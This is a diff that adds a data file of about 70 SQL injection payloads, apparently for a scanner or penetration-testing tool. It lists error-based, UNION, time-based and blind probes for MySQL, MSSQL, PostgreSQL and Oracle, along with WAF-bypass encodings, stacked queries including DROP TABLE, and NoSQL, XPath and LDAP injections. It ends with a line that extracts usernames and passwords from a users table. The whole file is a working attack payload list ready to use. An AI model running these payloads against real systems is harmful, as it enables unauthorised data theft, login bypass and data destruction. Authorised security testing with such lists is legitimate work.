@@ -1,0 +1,88 @@
+# Custom SQL Injection Payloads
+# Format: payload|type|dbms|description
+
+# Basic injection tests
+'|error_based|generic|Single quote test
+"|error_based|generic|Double quote test
+')|error_based|generic|Quote with parenthesis
+'))|error_based|generic|Quote with double parenthesis
+
+# OR-based injections
+' OR '1'='1|error_based|generic|Classic OR injection
+" OR "1"="1|error_based|generic|Double quote OR injection
+' OR 1=1--|error_based|generic|OR with SQL comment
+' OR 1=1#|error_based|generic|OR with hash comment
+
+# UNION-based injections
+' UNION SELECT NULL--|union_based|generic|Basic UNION test
+' UNION SELECT NULL,NULL--|union_based|generic|UNION with 2 columns
+' UNION SELECT NULL,NULL,NULL--|union_based|generic|UNION with 3 columns
+' UNION SELECT 1,VERSION(),3--|union_based|mysql|MySQL version extraction
+' UNION SELECT 1,@@VERSION,3--|union_based|mssql|MSSQL version extraction
+
+# Time-based injections
+' AND SLEEP(5)--|time_based|mysql|MySQL sleep test
+'; WAITFOR DELAY '00:00:05'--|time_based|mssql|MSSQL delay test
+' AND pg_sleep(5)--|time_based|postgresql|PostgreSQL sleep test
+' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5)=1--|time_based|oracle|Oracle delay test
+
+# Boolean-based blind
+' AND 1=1--|boolean_blind|generic|True condition test
+' AND 1=2--|boolean_blind|generic|False condition test
+' AND LENGTH(DATABASE())>0--|boolean_blind|mysql|MySQL database length test
+' AND LEN(DB_NAME())>0--|boolean_blind|mssql|MSSQL database length test
+
+# Error-based MySQL
+' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e))--|error_based|mysql|MySQL EXTRACTVALUE error
+' AND UPDATEXML(1, CONCAT(0x7e, VERSION(), 0x7e), 1)--|error_based|mysql|MySQL UPDATEXML error
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--|error_based|mysql|MySQL double query error
+
+# Error-based MSSQL
+' AND 1=CONVERT(int, @@version)--|error_based|mssql|MSSQL version conversion error
+' AND 1=CAST(@@version AS int)--|error_based|mssql|MSSQL version cast error
+' AND 1=CONVERT(int, DB_NAME())--|error_based|mssql|MSSQL database name error
+
+# Error-based Oracle
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--|error_based|oracle|Oracle version error
+' AND 1=UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--|error_based|oracle|Oracle UTL_INADDR error
+
+# Error-based PostgreSQL
+' AND 1=CAST(version() AS int)--|error_based|postgresql|PostgreSQL version cast error
+' AND 1=CAST(current_database() AS int)--|error_based|postgresql|PostgreSQL database cast error
+
+# WAF bypass payloads
+' /**/OR/**/ '1'='1'/**/--|waf_bypass|generic|Comment-based bypass
+' %0aOR%0a '1'='1'%0a--|waf_bypass|generic|Newline bypass
+' %09OR%09 '1'='1'%09--|waf_bypass|generic|Tab bypass
+'+UNION+SELECT+NULL--|waf_bypass|generic|Plus sign bypass
+'%20UNION%20SELECT%20NULL--|waf_bypass|generic|URL encoded bypass
+' /*!UNION*/ /*!SELECT*/ NULL--|waf_bypass|mysql|MySQL version comment bypass
+
+# Stacked queries
+'; SELECT 1--|stacked_queries|generic|Basic stacked query
+'; INSERT INTO temp VALUES (1)--|stacked_queries|generic|Stacked insert
+'; CREATE TABLE test (id INT)--|stacked_queries|generic|Stacked create table
+'; DROP TABLE test--|stacked_queries|generic|Stacked drop table
+
+# Second-order payloads
+admin'--|second_order|generic|Admin bypass attempt
+' OR 1=1 LIMIT 1--|second_order|mysql|MySQL limit bypass
+' OR 1=1 OFFSET 0 ROWS--|second_order|mssql|MSSQL offset bypass
+
+# NoSQL injection attempts
+' || '1'=='1|nosql|mongodb|MongoDB OR injection
+'; return true; //|nosql|mongodb|MongoDB JavaScript injection
+' && this.password.match(/.*/)//|nosql|mongodb|MongoDB regex injection
+
+# XML/XPath injection
+' or '1'='1|xpath|generic|XPath OR injection
+'] | //user/*[contains(*,'admin')] | a['|xpath|generic|XPath user enumeration
+
+# LDAP injection
+*)(uid=*))(|(uid=*|ldap|generic|LDAP wildcard injection
+*)(|(password=*))|ldap|generic|LDAP password bypass
+
+# Custom application-specific payloads
+' AND (SELECT COUNT(*) FROM users)>0--|custom|generic|User table existence check
+' AND (SELECT COUNT(*) FROM admin)>0--|custom|generic|Admin table existence check
+' UNION SELECT username,password FROM users--|custom|generic|User credential extraction
